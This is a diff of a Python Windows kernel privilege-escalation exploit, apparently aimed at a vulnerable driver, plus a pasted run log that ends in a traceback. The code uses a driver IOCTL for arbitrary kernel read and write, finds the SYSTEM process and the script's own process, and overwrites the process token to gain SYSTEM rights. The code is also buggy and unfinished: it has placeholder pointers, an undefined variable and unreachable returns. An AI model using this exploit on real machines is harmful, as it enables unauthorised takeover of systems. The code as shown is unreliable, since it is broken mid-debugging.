@@ -175,7 +175,8 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
     PsISP_kernel_address = c_ulonglong()
 
-    return system_process_base_pointer
+
+    return int(system_process_base_pointer)
 
 
 ################################################### WRITE ###########################################################
@@ -183,26 +184,26 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 def writePrimitive(driver, what_addr, where):
 
     IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(0x000000001a000000)
+    InputBuffer = c_void_p(1)
     InputBufferLength = 0x10
     OutputBuffer = c_void_p(0)
     OutputBufferLength = 0
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    # Write the what value to what_addr
+    # Write the what value to int(what_addr)
 
     data = struct.pack('<Q', what)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            what_addr, data, len(data), byref(written))
+            int(what_addr), data, len(data), byref(written))
 
     if dwStatus == 0:
         print ('Something went wrong while writing to memory', 'e')
         sys.exit()
 
-    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
+    data = struct.pack('<Q', int(what_addr)) + struct.pack('<Q', int(where))
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            0x000000001a000000, data, len(data), byref(written))
+            1, data, len(data), byref(written))
 
     if dwStatus == 0:
         print ('Something went wrong while writing to memory in the packing section'
@@ -210,7 +211,7 @@ def writePrimitive(driver, what_addr, where):
         sys.exit()
 
     print 'Value before DeviceIoControl: %08x' \
-        % cast(0x000000001a000000, POINTER(c_ulonglong))[0]
+        % cast(1, POINTER(c_ulonglong))[0]
 
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
@@ -223,7 +224,7 @@ def writePrimitive(driver, what_addr, where):
         NULL,
         )
 
-    print 'Value after: %08x' % cast(0x000000001a000000,
+    print 'Value after: %08x' % cast(1,
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
@@ -236,7 +237,7 @@ def readPrimitive(driver, what_addr, where):
     # We've created a block of memory at the top of userland via dwStatus
 
     IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(0x000000001a000000)
+    InputBuffer = c_void_p(1)
     InputBufferLength = 0x10
     OutputBuffer = c_void_p(0)
     OutputBufferLength = 0
@@ -245,9 +246,9 @@ def readPrimitive(driver, what_addr, where):
 
                                                             # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
 
-    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
+    data = struct.pack('<Q', int(what_addr)) + struct.pack('<Q', int(where))
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            0x000000001a000000, data, len(data), byref(written))
+            user_addr, data, len(data), byref(written))
 
     print 'Value before DeviceIoControl: %08x' % cast(user_addr,
             POINTER(c_ulonglong))[0]
@@ -265,6 +266,9 @@ def readPrimitive(driver, what_addr, where):
 
     print 'Value after: %08x' % cast(user_addr, POINTER(c_ulonglong))[0]
     read_value = cast(user_addr, POINTER(c_ulonglong))[0]
+    print "What the fuck is this read value? " + str(read_value)
+
+
     return triggerIOCTL
     return read_value
 
@@ -282,7 +286,7 @@ def get_current_eprocess(system_process_base_pointer, driver):
     flink = c_ulonglong()
     readPrimitive(driver, system_process_base_pointer
                   + active_process_links_offset, user_addr)
-
+    
     current_pEPROCESS = 0
     while 0x01:
         unique_process_id = c_ulonglong(0)
@@ -297,6 +301,7 @@ def get_current_eprocess(system_process_base_pointer, driver):
         readPrimitive(driver, system_process_base_pointer
                       + unique_process_id_offset, user_addr)
 
+        
         # Check if we're in the current process
 
         if os.getpid() == unique_process_id.value:
@@ -339,44 +344,79 @@ def getDriver():
 
 def executeOverwrite():
 
-        print "Getting Driver!"
+        print "MAIN Getting Driver!"
         driver = getDriver()
         
         # Get kernel base.
 
-        print "Got Driver, getting Kernel Base!"
+        print "MAIN Got Driver, getting Kernel Base!"
         (img_name, kernel_base) = getkernelBase(driver)
 
         # Get system process base.
 
-        print "Got Kernel Base, Getting System Process Base!"
+        print "MAIN Got Kernel Base, Getting System Process Base!"
         system_process_base_pointer = \
             get_PsISP_kernel_address(kernel_base, img_name)
 
         # Read the value of that token.
 
-        print "Got System Process Base, Getting System Token!"
+        print "MAIN Got System Process Base, Getting System Token!"
         read_value = readPrimitive(driver, system_process_base_pointer,
                                    user_addr)
 
         # Walk the process list for wherever our process is in memory.
 
-        print "Got System Token, Getting Current Process Base!"
+        print "MAIN Got System Token, Getting Current Process Base!"
         currentprocessBase = \
             get_current_eprocess(system_process_base_pointer, driver)
 
         # Define our expected offsets for this version of Windows.
 
-        print "We know the proper offsets now."
+        print "MAIN We know the proper offsets now."
         system_token = system_process_base_pointer + 0x358
         current_token = currentprocessBase + 0x358
 
         # Write the system_token over our current_token for SYSTEM privileges.
 
-        print "Attempting system to current token overwrite!"
+        print "MAIN Attempting system to current token overwrite!"
         success = writePrimitive(driver, system_token, current_token)
 
-        print "Success!"
+        print "MAIN Success!"
 ############################################ RUN ################################################
 
 executeOverwrite()
+
+'''
+C:\Users\n00b\Desktop>python sploit.py
+MAIN Getting Driver!
+[X] Got handle to the driver.
+
+MAIN Got Driver, getting Kernel Base!
+[*] Calling NtQuerySystemInformation w/SystemModuleInformation
+[*] Success, allocated 55952-byte result buffer
+[*] Result buffer contains 189 SystemModuleInformation objects
+[*] Kernel Type: ntoskrnl.exe
+[*] Kernel Base: 0xfffff80215409000
+MAIN Got Kernel Base, Getting System Process Base!
+[+] Loading ntoskrnl.exe in Userland
+[+] PsInitialSystemProcess Userland Base Address: 0x7FF751D71FA0
+[+] PsInitialSystemProcess Kernel Base Address: 0xFFFFF802157EAFA0
+MAIN Got System Process Base, Getting System Token!
+Value before DeviceIoControl: fffff802157eafa0
+Value after: fffff802157eafa0
+What the fuck is this read value? 18446735286567088032
+MAIN Got System Token, Getting Current Process Base!
+Value before DeviceIoControl: fffff802157eb288
+Value after: fffff802157eb288
+What the fuck is this read value? 18446735286567088776
+Traceback (most recent call last):
+  File "sploit.py", line 387, in <module>
+    executeOverwrite()
+  File "sploit.py", line 371, in executeOverwrite
+    get_current_eprocess(system_process_base_pointer, driver)
+  File "sploit.py", line 302, in get_current_eprocess
+    + unique_process_id_offset, user_addr)
+  File "sploit.py", line 249, in readPrimitive
+    data = struct.pack('<Q', int(what_addr)) + struct.pack('<Q', int(where))
+struct.error: integer out of range for 'Q' format code
+'''
